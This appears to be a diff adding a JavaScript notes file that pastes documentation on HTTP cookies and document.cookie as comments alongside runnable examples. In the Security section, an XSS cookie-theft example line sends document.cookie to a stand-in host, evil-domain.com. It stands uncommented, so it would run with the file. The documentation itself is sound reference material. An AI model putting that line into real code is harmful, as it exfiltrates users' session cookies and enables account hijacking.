+// originalcompany.com:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: qwerty=219ffwef9w0f; Domain=somecompany.co.uk
+// A cookie for a subdomain of the serving domain will be rejected.
+
+// The following cookie will be rejected if set by a server hosted on example.com:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: sessionId=e8bb43229de9; Domain=foo.example.com
+
+// Cookie prefixes
+// Cookie names prefixed with __Secure- or __Host- 
+// can be used only if they are set with the 
+// secure attribute from a secure (HTTPS) origin.
+
+// In addition, cookies with the __Host- 
+// prefix must have a path of / (meaning 
+// any path at the host) and must not 
+// have a Domain attribute.
+
+// Warning: For clients that don't 
+// implement cookie prefixes, you 
+// cannot count on these additional 
+// assurances, and prefixed cookies 
+// will always be accepted.
+
+// HTTP
+// Copy to Clipboard
+// Both accepted when from a secure origin (HTTPS)
+// Set-Cookie: __Secure-ID=123; Secure; Domain=example.com
+// Set-Cookie: __Host-ID=123; Secure; Path=/
+
+// Rejected due to missing Secure attribute
+// Set-Cookie: __Secure-id=1
+
+// Rejected due to the missing Path=/ attribute
+// Set-Cookie: __Host-id=1; Secure
+
+// Rejected due to setting a Domain
+// Set-Cookie: __Host-id=1; Secure; Path=/; Domain=example.com
+// Partitioned cookie
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: __Host-example=34d8g; SameSite=None; Secure; Path=/; Partitioned;
+// Note: Partitioned cookies must be set with Secure. In addition, it is recommended to use the __Host prefix when setting partitioned cookies to make them bound to the hostname and not the registrable domain.
+
+console.log("Document: cookie ")
+
+// Document: cookie property
+// The Document property cookie lets 
+// you read and write cookies 
+// associated with the document. 
+// It serves as a getter and setter 
+// for the actual values of the cookies.
+
+// Syntax
+// Read all cookies accessible from this location
+// JS
+// Copy to Clipboard
+allCookies = document.cookie;
+// In the code above allCookies is a 
+// string containing a semicolon-separated 
+// list of all cookies (i.e. key=value pairs). 
+// Note that each key and value may be 
+// surrounded by whitespace (space and 
+// tab characters): in fact, RFC 6265 
+// mandates a single space after each 
+// semicolon, but some user agents 
+// may not abide by this.
+
+// Write a new cookie
+// JS
+// Copy to Clipboard
+document.cookie = newCookie;
+// In the code above, newCookie is 
+// a string of form key=value, 
+// specifying the cookie to set/update.
+//  Note that you can only set/update 
+// a single cookie at a time using 
+// this method. Consider also that:
+
+// Any of the following cookie 
+// attribute values can optionally 
+// follow the key-value pair, each 
+// preceded by a semicolon separator:
+
+// ;domain=domain (e.g., example.com 
+// or subdomain.example.com): The 
+// host to which the cookie will be 
+// sent. If not specified, this 
+// defaults to the host portion of 
+// the current document location and 
+// the cookie is not available on subdomains. 
+// If a domain is specified, subdomains 
+// are always included. Contrary to 
+// earlier specifications, leading 
+// dots in domain names are ignored, 
+// but browsers may decline to set 
+// the cookie containing such dots.
+
+// Note: The domain must match the 
+// domain of the JavaScript origin. 
+// Setting cookies to foreign 
+// domains will be silently ignored.
+
+// ;expires=date-in-GMTString-format: 
+// The expiry date of the cookie. 
+// If neither expires nor max-age 
+// is specified, it will expire 
+// at the end of session.
+
+// Warning: When user privacy is 
+// a concern, it's important that 
+// any web app implementation 
+// invalidate cookie data after 
+// a certain timeout instead of 
+// relying on the browser to do it. 
+// Many browsers let users specify 
+// that cookies should never expire, 
+// which is not necessarily safe.
+
+// See Date.toUTCString() for help formatting this value.
+// ;max-age=max-age-in-seconds: The maximum 
+// age of the cookie in seconds 
+// (e.g., 60*60*24*365 or 31536000 for a year).
+
+// ;partitioned: Indicates that the cookie 
+// should be stored using partitioned storage. 
+// See Cookies Having Independent Partitioned 
+// State (CHIPS) for more details.
+
+// ;path=path: The value of the 
+// cookie's Path attribute.
+
+// ;samesite: SameSite prevents the 
+// browser from sending this cookie 
+// along with cross-site requests. 
+// Possible values are lax, strict or none.
+
+// The lax value will send the cookie 
+// for all same-site requests and 
+// top-level navigation GET requests. 
+// This is sufficient for user tracking, 
+// but it will prevent many Cross-Site 
+// Request Forgery (CSRF) attacks. This 
+// is the default value in modern browsers.
+
+// The strict value will prevent the cookie 
+// from being sent by the browser to the 
+// target site in all cross-site browsing 
+// contexts, even when following a regular link.
+
+// The none value explicitly states no 
+// restrictions will be applied. The 
+// cookie will be sent in all 
+// requests—both cross-site and 
+// same-site.
+
+// ;secure: Specifies that the 
+// cookie should only be transmitted 
+// over a secure protocol.
+
+// The cookie value string can use 
+// encodeURIComponent() to ensure 
+// that the string does not contain 
+// any commas, semicolons, or
+//  whitespace (which are disallowed in cookie values).
+
+// Some user agent implementations 
+// support the following cookie prefixes:
+
+// __Secure- Signals to the browser 
+// that it should only include the 
+// cookie in requests transmitted 
+// over a secure channel.
+
+// __Host- Signals to the browser 
+// that in addition to the restriction 
+// to only use the cookie from a secure 
+// origin, the scope of the cookie is 
+// limited to a path attribute passed 
+// down by the server. If the server 
+// omits the path attribute the 
+// "directory" of the request URI
+//  is used. It also signals that 
+// the domain attribute must not be 
+// present, which prevents the cookie 
+// from being sent to other domains. 
+// For Chrome the path attribute 
+// must always be the origin.
+
+// Note: The dash is considered part of the prefix.
+
+// Note: These flags are only 
+// settable with the secure attribute.
+
+// Note: As you can see from the code 
+// above, document.cookie is an accessor 
+// property with native setter and getter 
+// functions, and consequently is not 
+// a data property with a value: what 
+// you write is not the same as what 
+// you read, everything is always 
+// mediated by the JavaScript interpreter.
+
+// Examples
+// Example 1: Simple usage
+// JS
+// Play
+// Copy to Clipboard
+// Note that we are setting `SameSite=None;` in this example because the example
+// needs to work cross-origin.
+
+// It is more common not to set the `SameSite` 
+// attribute, which results in the default,
+
+// and more secure, value of `SameSite=Lax;`
+document.cookie = "name=oeschger; SameSite=None; Secure";
+document.cookie = "favorite_food=tripe; SameSite=None; Secure";
+
+function showCookies() {
+    const output = document.getElementById("cookies");
+    output.textContent = `> ${document.cookie}`;
+}
+
+function clearOutputCookies() {
+    const output = document.getElementById("cookies");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+{/* <button onclick="showCookies()">Show cookies</button>
+
+<button onclick="clearOutputCookies()">Clear</button>
+
+<div>
+  <code id="cookies"></code>
+</div> */}
+// Play
+
+// Example 2: Get a sample cookie named test2
+// JS
+// Play
+// Copy to Clipboard
+// Note that we are setting `SameSite=None;` 
+// in this example because the example
+
+// needs to work cross-origin.
+// It is more common not to set the 
+// `SameSite` attribute, which 
+// results in the default,
+// and more secure, value of `SameSite=Lax;`
+document.cookie = "test1=Hello; SameSite=None; Secure";
+document.cookie = "test2=World; SameSite=None; Secure";
+
+const cookieValue = document.cookie
+    .split("; ")
+    .find((row) => row.startsWith("test2="))
+    ?.split("=")[1];
+
+function showCookieValue() {
+    const output = document.getElementById("cookie-value");
+    output.textContent = `> ${cookieValue}`;
+}
+
+function clearOutputCookieValue() {
+    const output = document.getElementById("cookie-value");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+// < button onclick = "showCookieValue()" > Show cookie value</ >
+
+// <button onclick="clearOutputCookieValue()">Clear</button>
+
+// <div>
+//   <code id="cookie-value"></code>
+// </div>
+// Play
+
+// Example 3: Do something only once
+// In order to use the following code, 
+// please replace all occurrences of 
+// the word doSomethingOnlyOnce(the 
+// name of the cookie) with a custom name.
+
+//     JS
+// Play
+// Copy to Clipboard
+function doOnce() {
+    if (
+        !document.cookie
+            .split("; ")
+            .find((row) => row.startsWith("doSomethingOnlyOnce"))
+    ) {
+        // Note that we are setting `SameSite=None;` in this example because the example
+        // needs to work cross-origin.
+        // It is more common not to set the `SameSite` attribute, which results in the default,
+        // and more secure, value of `SameSite=Lax;`
+        document.cookie =
+            "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";
+
+        const output = document.getElementById("do-once");
+        output.textContent = "> Do something here!";
+    }
+}
+
+function clearOutputDoOnce() {
+    const output = document.getElementById("do-once");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+//     < button onclick = "doOnce()" > Only do something once</ >
+
+// <button onclick="clearOutputDoOnce()">Clear</button>
+
+// <div>
+//   <code id="do-once"></code>
+// </div>
+// Play
+
+// Example 4: Reset the previous cookie
+function resetOnce() {
+    // Note that we are setting `SameSite=None;` in this example because the example
+    // needs to work cross-origin.
+    // It is more common not to set the `SameSite` attribute, which results in the default,
+    // and more secure, value of `SameSite=Lax;`
+    document.cookie =
+        "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";
+
+    const output = document.getElementById("reset-once");
+    output.textContent = "> Reset!";
+}
+
+function clearOutputResetOnce() {
+    const output = document.getElementById("reset-once");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+// < button onclick = "resetOnce()" > Reset only once cookie</ >
+
+// <button onclick="clearOutputResetOnce()">Clear</button>
+
+// <div>
+//   <code id="reset-once"></code>
+// </div>
+// Play
+
+// Example 5: Check a cookie existence
+// JS
+// Play
+// Copy to Clipboard
+// Note that we are setting 
+// `SameSite=None;` in this 
+// example because the example
+
+// needs to work cross-origin.
+// It is more common not to set 
+// the `SameSite` attribute, 
+// which results in the default,
+
+// and more secure, value of `SameSite=Lax;`
+document.cookie = "reader=1; SameSite=None; Secure";
+
+function checkACookieExists() {
+    if (
+        document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
+    ) {
+        const output = document.getElementById("a-cookie-existence");
+        output.textContent = '> The cookie "reader" exists';
+    }
+}
+
+function clearOutputACookieExists() {
+    const output = document.getElementById("a-cookie-existence");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+// < button onclick = "checkACookieExists()" > Check a cookie exists</ >
+// <button onclick="clearOutputACookieExists()">Clear</button>
+// <div>
+//   <code id="a-cookie-existence"></code>
+// </div>
+// Play
+
+// Example 6: Check that a cookie has a specific value
+function checkCookieHasASpecificValue() {
+    if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
+        const output = document.getElementById("a-specific-value-of-the-cookie");
+        output.textContent = '> The cookie "reader" has a value of "1"';
+    }
+}
+
+function clearASpecificValueOfTheCookie() {
+    const output = document.getElementById("a-specific-value-of-the-cookie");
+    output.textContent = "";
+}
+// HTML
+// Play
+// Copy to Clipboard
+//     < button onclick = "checkCookieHasASpecificValue()" >
+//         Check that a cookie has a specific value
+// </ >
+
+// <button onclick="clearASpecificValueOfTheCookie()">Clear</button>
+
+// <div>
+//   <code id="a-specific-value-of-the-cookie"></code>
+// </div>
+// Play
+
+// Security
+// It is important to note that the 
+// path attribute does not protect 
+// against unauthorized reading of 
+// the cookie from a different path.
+// It can be easily bypassed using 
+// the DOM, for example by creating 
+// a hidden < iframe > element with 
+// the path of the cookie, then 
+// accessing this iframe's 
+// contentDocument.cookie property. 
+// The only way to protect the cookie 
+// is by using a different domain or 
+// subdomain, due to the same origin policy.
+
+// Cookies are often used in web 
+// applications to identify a user 
+// and their authenticated session.
+// Stealing a cookie from a web 
+// application leads to hijacking 
+// the authenticated user's session. 
+// Common ways to steal cookies include 
+// using social engineering or by 
+// exploiting a cross-site scripting 
+// (XSS) vulnerability in the application -
+
+// JS
+// Copy to Clipboard
+new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
+// The HTTPOnly cookie attribute can 
+// help to mitigate this attack by 
+// preventing access to cookie value 
+// through JavaScript.Read more about 
+// Cookies and Security.
+
+//     Notes
+// Starting with Firefox 2, a better 
+// mechanism for client - side storage 
+// is available - WHATWG DOM Storage.
+
+// You can delete a cookie by updating 
+// its expiration time to zero.
+
+// Keep in mind that the more cookies 
+// you have, the more data will be 
+// transferred between the server and 
+// the client for each request.This 
+// will make each request slower.It 
+// is highly recommended for you to 
+// use WHATWG DOM Storage if you are 
+// going to keep "client-only" data.
+
+// RFC 2965(Section 5.3, "Implementation Limits") 
+// specifies that there should be no maximum 
+// length of a cookie's key or value size, 
+// and encourages implementations to support 
+// arbitrarily large cookies. Each browser's
+//  implementation maximum will necessarily 
+// be different, so consult individual 
+// browser documentation.
+
+// The reason for the syntax of the 
+// document.cookie accessor property 
+// is due to the client - server nature 
+// of cookies, which differs from other 
+// client - client storage methods(like, 
+// for instance, localStorage):
+
+// The server tells the client to store a cookie
+// BASH
+// Copy to Clipboard
+// HTTP / 1.0 200 OK
+// Content - type: text / html
+// Set - Cookie: cookie_name1 = cookie_value1
+// Set - Cookie: cookie_name2 = cookie_value2; expires = Sun, 16 Jul 3567 06: 23: 41 GMT
+
+// [content of the page here]
+// The client sends back to the server its cookies previously stored
+// BASH
+// Copy to Clipboard
+// GET / sample_page.html HTTP / 1.1
+// Host: www.example.org
+// Cookie: cookie_name1 = cookie_value1; cookie_name2 = cookie_value2
+// Accept: */*
+// Specifications
+
+console.log("Using HTTP cookies")
+// An HTTP cookie (web cookie, browser cookie) 
+// is a small piece of data that a server 
+// sends to a user's web browser. The 
+// browser may store the cookie and send 
+// it back to the same server with later 
+// requests. Typically, an HTTP cookie is 
+// used to tell if two requests come from 
+// the same browser—keeping a user logged 
+// in, for example. It remembers stateful 
+// information for the stateless HTTP protocol.
+
+// Cookies are mainly used for three purposes:
+
+// Session management
+// Logins, shopping carts, game scores,
+//  or anything else the server should remember
+
+// Personalization
+// User preferences, themes, and other settings
+
+// Tracking
+// Recording and analyzing user behavior
+
+// Cookies were once used for general 
+// client-side storage. While this made 
+// sense when they were the only way to 
+// store data on the client, modern storage 
+// APIs are now recommended. Cookies are 
+// sent with every request, so they can 
+// worsen performance (especially for 
+// mobile data connections). Modern APIs 
+// for client storage are the Web Storage
+//  API (localStorage and sessionStorage) 
+// and IndexedDB.
+
+// Note: To see stored cookies (and other 
+// storage that a web page can use), you 
+// can enable the Storage Inspector in 
+// Developer Tools and select Cookies 
+// from the storage tree.
+
+// Creating cookies
+// After receiving an HTTP request, a 
+// server can send one or more Set-Cookie 
+// headers with the response. The browser 
+// usually stores the cookie and sends it 
+// with requests made to the same server 
+// inside a Cookie HTTP header. You can 
+// specify an expiration date or time 
+// period after which the cookie 
+// shouldn't be sent. You can also 
+// set additional restrictions to 
+// a specific domain and path to 
+// limit where the cookie is sent. 
+// For details about the header 
+// attributes mentioned below, 
+// refer to the Set-Cookie 
+// reference article.
+
+// The Set-Cookie and Cookie headers
+// The Set-Cookie HTTP response 
+// header sends cookies from the 
+// server to the user agent. 
+// A simple cookie is set like this:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: <cookie-name>=<cookie-value>
+// This instructs the server sending 
+// headers to tell the client to 
+// store a pair of cookies:
+
+// HTTP
+// Copy to Clipboard
+// HTTP/2.0 200 OK
+// Content-Type: text/html
+// Set-Cookie: yummy_cookie=choco
+// Set-Cookie: tasty_cookie=strawberry
+
+// [page content]
+// Then, with every subsequent request 
+// to the server, the browser sends all 
+// previously stored cookies back to 
+// the server using the Cookie header.
+
+// HTTP
+// Copy to Clipboard
+// GET /sample_page.html HTTP/2.0
+// Host: www.example.org
+// Cookie: yummy_cookie=choco; tasty_cookie=strawberry
+// Note: Here's how to use the Set-Cookie 
+// header in various server-side applications:
+
+// PHP
+// Node.JS
+// Python
+// Ruby on Rails
+
+// Define the lifetime of a cookie
+// Cookies can persist for two different 
+// periods, depending on the attributes 
+// used with the Set-Cookie header when 
+// they were created:
+
+// Permanent cookies are deleted at 
+// a date specified by the Expires 
+// attribute or after a period 
+// prescribed by the Max-Age attribute.
+
+// Session cookies – cookies without 
+// a Max age or Expires attribute – 
+// are deleted when the current session 
+// ends. The browser defines when 
+// the "current session" ends, and 
+// some browsers use session restoring 
+// when restarting. This can cause 
+// session cookies to last indefinitely.
+
+// For example:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: id=a3fWa; Expires=Thu, 31 Oct 2021 07:28:00 GMT;
+// Note: When you set an Expires date
+//  and time, they're relative to the 
+// client the cookie is being set on, 
+// not the server.
+
+// If your site authenticates users, 
+// it should regenerate and resend 
+// session cookies, even ones that 
+// already exist, whenever a user 
+// authenticates. This approach 
+// helps prevent session fixation 
+// attacks, where a third party 
+// can reuse a user's session.
+
+// Restrict access to cookies
+// You can ensure that cookies are sent 
+// securely and aren't accessed by 
+// unintended parties or scripts in 
+// one of two ways: with the Secure 
+// attribute and the HttpOnly attribute.
+
+// A cookie with the Secure attribute 
+// is only sent to the server with an 
+// encrypted request over the HTTPS 
+// protocol. It's never sent with 
+// unsecured HTTP (except on localhost), 
+// which means man-in-the-middle attackers 
+// can't access it easily. Insecure sites 
+// (with http: in the URL) can't set 
+// cookies with the Secure attribute. 
+// However, don't assume that Secure 
+// prevents all access to sensitive 
+// information in cookies. For example, 
+// someone with access to the client's 
+// hard disk (or JavaScript if the 
+// HttpOnly attribute isn't set) can 
+// read and modify the information.
+
+// A cookie with the HttpOnly attribute 
+// is inaccessible to the JavaScript 
+// Document.cookie API; it's only sent 
+// to the server. For example, cookies 
+// that persist in server-side sessions 
+// don't need to be available to 
+// JavaScript and should have the 
+// HttpOnly attribute. This precaution 
+// helps mitigate cross-site 
+// scripting (XSS) attacks.
+
+// Here's an example:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: id=a3fWa; Expires=Thu, 21 Oct 2021 07:28:00 GMT; Secure; HttpOnly
+
+
+// Define where cookies are sent
+// The Domain and Path attributes define 
+// the scope of a cookie: what URLs 
+// the cookies should be sent to.
+
+// Domain attribute
+// The Domain attribute specifies 
+// which server can receive a cookie.
+
+// If specified, then cookies are 
+// available on the server and its 
+// subdomains. For example, if you 
+// set Domain=mozilla.org, cookies 
+// are available on mozilla.org and 
+// its subdomains like developer.mozilla.org.
+
+// If the server does not specify 
+// a Domain, the cookies are available 
+// on the server but not on its subdomains. 
+// Therefore, specifying Domain is less 
+// restrictive than omitting it. However, 
+// it can be helpful when subdomains need 
+// to share information about a user.
+
+// Path attribute
+// The Path attribute indicates a URL 
+// path that must exist in the requested 
+// URL in order to send the Cookie header. 
+// The %x2F ("/") character is considered 
+// a directory separator, and subdirectories 
+// match as well.
+
+// For example, if you set Path=/docs, 
+// these request paths match:
+
+// /docs
+// /docs/
+// /docs/Web/
+// /docs/Web/HTTP
+// But these request paths don't:
+
+// /
+// /docsets
+// /fr/docs
+
+// PATH DEFAULT VALUE
+// If the Path attribute is not set, 
+// its default value is computed from 
+// the path of the URI that set the 
+// cookie, as follows:
+
+// If the path is empty, does not start 
+// with "/", or contains no more than 
+// one "/" character, then the default 
+// value for Path is "/".
+
+// Otherwise, the default value for 
+// Path is the path from the start 
+// up to but not including the 
+// final "/" character.
+
+// For example, if the cookie was 
+// set from "https://example.org/a/b/c, 
+// then the default value of Path 
+// would be "/a/b".
+
+// SameSite attribute
+// The SameSite attribute lets servers 
+// specify whether/when cookies are 
+// sent with cross-site requests 
+// (where Site is defined by the 
+// registrable domain and 
+// the scheme: http or https). 
+// This provides some protection 
+// against cross-site request forgery 
+// attacks (CSRF). It takes three 
+// possible values: Strict, Lax, and None.
+
+// With Strict, the browser only 
+// sends the cookie with requests 
+// from the cookie's origin site. 
+// Lax is similar, except the browser 
+// also sends the cookie when the user 
+// navigates to the cookie's origin site 
+// (even if the user is coming from a 
+// different site). For example, by 
+// following a link from an external 
+// site. None specifies that cookies 
+// are sent on both originating and 
+// cross-site requests, but only in 
+// secure contexts (i.e., if 
+// SameSite=None then the Secure 
+// attribute must also be set). If 
+// no SameSite attribute is set, the 
+// cookie is treated as Lax.
+
+// Here's an example:
+
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: mykey=myvalue; SameSite=Strict
+// Note: The standard related to SameSite 
+// recently changed (MDN documents the 
+// new behavior above). See the cookies 
+// Browser compatibility table for 
+// information about how the attribute 
+// is handled in specific browser versions:
+
+// SameSite=Lax is the new default if 
+// SameSite isn't specified. Previously, 
+// cookies were sent for all requests by default.
+
+// Cookies with SameSite=None must now 
+// also specify the Secure attribute 
+// (they require a secure context).
+
+// Cookies from the same domain are 
+// no longer considered to be from 
+// the same site if sent using a 
+// different scheme (http: or https:).
+
+// Cookie prefixes
+// Because of the design of the cookie 
+// mechanism, a server can't confirm 
+// that a cookie was set from a secure 
+// origin or even tell where a cookie 
+// was originally set.
+
+// A vulnerable application on a 
+// subdomain can set a cookie with 
+// the Domain attribute, which gives 
+// access to that cookie on all 
+// other subdomains. This mechanism 
+// can be abused in a session fixation 
+// attack. See session fixation for 
+// primary mitigation methods.
+
+// As a defense-in-depth measure, 
+// however, you can use cookie prefixes 
+// to assert specific facts about the 
+// cookie. Two prefixes are available:
+
+// __Host-
+// If a cookie name has this prefix, 
+// it's accepted in a Set-Cookie header 
+// only if it's also marked with the 
+// Secure attribute, was sent from 
+// a secure origin, does not include 
+// a Domain attribute, and has the 
+// Path attribute set to /. This way, 
+// these cookies can be seen as "domain-locked".
+
+// __Secure-
+// If a cookie name has this prefix, 
+// it's accepted in a Set-Cookie header 
+// only if it's marked with the Secure 
+// attribute and was sent from a secure 
+// origin. This is weaker than the __Host- prefix.
+
+// The browser will reject cookies 
+// with these prefixes that don't comply 
+// with their restrictions. Note that 
+// this ensures that subdomain-created 
+// cookies with prefixes are either 
+// confined to the subdomain or ignored 
+// completely. As the application server 
+// only checks for a specific cookie 
+// name when determining if the user is 
+// authenticated or a CSRF token is 
+// correct, this effectively acts as 
+// a defense measure against session 
+// fixation.
+// 
+
+// Note: On the application server, 
+// the web application must check 
+// for the full cookie name including 
+// the prefix. User agents do not strip 
+// the prefix from the cookie before 
+// sending it in a request's Cookie header.
+
+// For more information about cookie 
+// prefixes and the current state of 
+// browser support, see the Prefixes 
+// section of the Set-Cookie reference article.
+
+// JavaScript access using Document.cookie
+// You can create new cookies via 
+// JavaScript using the Document.cookie 
+// property. You can access existing 
+// cookies from JavaScript as well if 
+// the HttpOnly flag isn't set.
+
+// JS
+// Copy to Clipboard
+// document.cookie = "yummy_cookie=choco";
+// document.cookie = "tasty_cookie=strawberry";
+// console.log(document.cookie);
+// // logs "yummy_cookie=choco; tasty_cookie=strawberry"
+// Cookies created via JavaScript 
+// can't include the HttpOnly flag.
+
+// Please note the security issues in 
+// the Security section below. Cookies 
+// available to JavaScript can be 
+// stolen through XSS.
+
+// Security
+// Note: When you store information 
+// in cookies, keep in mind that all 
+// cookie values are visible to, 
+// and can be changed by, the end user. 
+// Depending on the application, you 
+// may want to use an opaque identifier 
+// that the server looks up, or investigate 
+// alternative authentication/confidentiality 
+// mechanisms such as JSON Web Tokens.
+
+// Ways to mitigate attacks involving cookies:
+
+// Use the HttpOnly attribute to prevent 
+// access to cookie values via JavaScript.
+
+// Cookies that are used for sensitive 
+// information (such as indicating authentication) 
+// should have a short lifetime, with the 
+// SameSite attribute set to Strict or Lax. 
+// (See SameSite attribute, above.) In 
+// browsers that support SameSite, this 
+// ensures that the authentication cookie 
+// isn't sent with cross-site requests. 
+// This would make the request effectively 
+// unauthenticated to the application server.
+
+
+// Tracking and privacy
+// Third-party cookies
+// A cookie is associated with a particular 
+// domain and scheme (such as http or https), 
+// and may also be associated with subdomains 
+// if the Set-Cookie Domain attribute is set. 
+// If the cookie domain and scheme match 
+// the current page, the cookie is considered 
+// to be from the same site as the page, 
+// and is referred to as a first-party cookie.
+
+// If the domain and scheme are different, 
+// the cookie is not considered to be from 
+// the same site, and is referred to as 
+// a third-party cookie. While the server 
+// hosting a web page sets first-party 
+// cookies, the page may contain components 
+// stored on servers in other domains, such 
+// as images or other documents embedded 
+// in <iframe>s. These components may 
+// set third-party cookies.
+
+// Note: Third-party cookies are 
+// sometimes referred to as cross-site 
+// cookies. This is arguably a more 
+// accurate name, as third-party cookies 
+// imply ownership by a third-party 
+// company or organization. However, 
+// the behavior and potential issues 
+// are the same whether or not you 
+// own all the involved sites.
+
+// Typical use cases for third-party 
+// cookies include sharing user profile 
+// information or collecting analytics 
+// across different related domains. 
+// They are also often used for 
+// advertising and tracking users 
+// across the web.
+
+// Note: Companies should disclose 
+// the types of cookies they use on 
+// their sites for transparency 
+// purposes and to comply with
+//  regulations. For example, 
+// see Google's notice on the 
+// types of cookies it uses and
+//  Mozilla's Websites, 
+// Communications & Cookies 
+// Privacy Notice.
+
+// A third-party server can create 
+// a profile of a user's browsing 
+// history and habits based on 
+// cookies sent to it by the same 
+// browser when accessing multiple 
+// sites. Firefox, by default, blocks 
+// third-party cookies that are known 
+// to contain trackers. Third-party 
+// cookies (or just tracking cookies) 
+// may also be blocked by other browser 
+// settings or extensions. Cookie 
+// blocking can cause some third-party 
+// components (such as social media 
+// widgets) not to function as intended.
+
+// There are some useful features 
+// available for developers who wish 
+// to respect user privacy, and 
+// minimize third-party tracking:
+
+// Servers can (and should) set 
+// the cookie SameSite attribute 
+// to specify whether or not 
+// third-party cookies may be sent.
+
+// Cookies Having Independent 
+// Partitioned State (CHIPS) enables 
+// developers to opt-in their cookies 
+// to partitioned storage, with 
+// a separate cookie jar per top-level 
+// site. This enables valid non-tracking 
+// uses of third-party cookies to 
+// continue working in browsers that 
+// do not allow cookies to be used 
+// for third-party tracking.
+
+
+// Cookie-related regulations
+// Legislation or regulations that 
+// cover the use of cookies include:
+
+// The General Data Privacy 
+// Regulation (GDPR) in the European Union
+// The ePrivacy Directive in the EU
+
+// The California Consumer Privacy Act
+// These regulations have global reach. 
+// They apply to any site on the World 
+// Wide Web that users from these 
+// jurisdictions access (the EU and 
+// California, with the caveat that 
+// California's law applies only to 
+// entities with gross revenue over 
+// 25 million USD, among things).
+
+// These regulations include requirements such as:
+
+// Notifying users that your site uses cookies.
+// Allowing users to opt out of 
+// receiving some or all cookies.
+// Allowing users to use the bulk 
+// of your service without receiving cookies.
+// There may be other regulations 
+// that govern the use of cookies 
+// in your locality. The burden is 
+// on you to know and comply with 
+// these regulations. There are 
+// companies that offer "cookie banner" 
+// code that helps you comply with 
+// these regulations.
+
+// Other ways to store information in the browser
+// Another approach to storing data in 
+// the browser is the Web Storage API. 
+// The window.sessionStorage and 
+// window.localStorage properties 
+// correspond to session and permanent 
+// cookies in duration, but have larger 
+// storage limits than cookies, and are 
+// never sent to a server. More structured 
+// and larger amounts of data can be 
+// stored using the IndexedDB API, 
+// or a library built on it.
+
+// There are some techniques designed 
+// to recreate cookies after they're 
+// deleted. These are known as "zombie" 
+// cookies. These techniques violate 
+// the principles of user privacy and 
+// user control, may violate data 
+// privacy regulations, and could 
+// expose a website using them to 
+// legal liability.
+
+// mdn 
+console.log("Cookie")
+
+// The Cookie HTTP request header 
+// contains stored HTTP cookies 
+// associated with the server 
+// (i.e. previously sent by the 
+// server with the Set-Cookie 
+// header or set in JavaScript 
+// using Document.cookie).
+
+// The Cookie header is optional 
+// and may be omitted if, for 
+// example, the browser's privacy 
+// settings block cookies.
+
+// Header type	                Request header
+// Forbidden header name	    yes
+
+
+// Syntax
+// HTTP
+// Copy to Clipboard
+// Cookie: <cookie-list>
+// Cookie: name=value
+// Cookie: name=value; name2=value2; name3=value3
+// Directives
+// <cookie-list>
+// A list of name-value pairs in the form 
+// of <cookie-name>=<cookie-value>. 
+// Pairs in the list are separated 
+// by a semicolon and a space ('; ').
+
+// Examples
+// HTTP
+// Copy to Clipboard
+// Cookie: PHPSESSID=298zf09hf012fh2; csrftoken=u32t4o3tb3gg43; _gat=1
+
+
+console.log("Set-Cookie")
+// The Set-Cookie HTTP response header is 
+// used to send a cookie from the server 
+// to the user agent, so that the user 
+// agent can send it back to the server 
+// later. To send multiple cookies, 
+// multiple Set-Cookie headers should 
+// be sent in the same response.
+
+// Warning: Browsers block frontend 
+// JavaScript code from accessing 
+// the Set-Cookie header, as required 
+// by the Fetch spec, which defines 
+// Set-Cookie as a forbidden 
+// response-header name that must 
+// be filtered out from any response 
+// exposed to frontend code.
+
+// For more information, see 
+// the guide on Using HTTP cookies.
+
+// Header type	                            Response header
+// Forbidden header name	                no
+// Forbidden response header name	        yes
+
+// Syntax
+// HTTP
+// Copy to Clipboard
+// Set-Cookie: <cookie-name>=<cookie-value>
+// Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
+// Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
+// Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly
+// Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<number>
+// Set-Cookie: <cookie-name>=<cookie-value>; Partitioned
+// Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
+// Set-Cookie: <cookie-name>=<cookie-value>; Secure
+
+// Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Strict
+// Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Lax
+// Set-Cookie: <cookie-name>=<cookie-value>; SameSite=None; Secure
+// Multiple attributes are also possible, for example:
+// Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
+
+// Attributes
+// <cookie-name>=<cookie-value>
+// Defines the cookie name and its value. 
+// A cookie definition begins with a name-value pair.
+
+// A <cookie-name> can contain any 
+// US-ASCII characters except for: 
+// control characters (ASCII characters 
+// 0 up to 31 and ASCII character 127) 
+// or separator characters (space, tab 
+// and the characters: ( ) < > @ , ; : \ " / [ ] ? = { })
+
+// A <cookie-value> can optionally 
+// be wrapped in double quotes and 
+// include any US-ASCII character 
+// excluding control characters 
+// (ASCII characters 0 up to 31 
+// and ASCII character 127), 
+// Whitespace, double quotes, 
+// commas, semicolons, and backslashes.
+
+// Encoding: Many implementations 
+// perform URL encoding on cookie values. 
+// However, this is not required by the 
+// RFC specification. The URL encoding 
+// does help to satisfy the requirements 
+// of the characters allowed for <cookie-value>.
+
+// Note: Some <cookie-name> have a 
+// specific semantic:
+
+// __Secure- prefix: Cookies with names 
+// starting with __Secure- (dash is part 
+// of the prefix) must be set with the 
+// secure flag from a secure page (HTTPS).
+
+// __Host- prefix: Cookies with names 
+// starting with __Host- must be set 
+// with the secure flag, must be from 
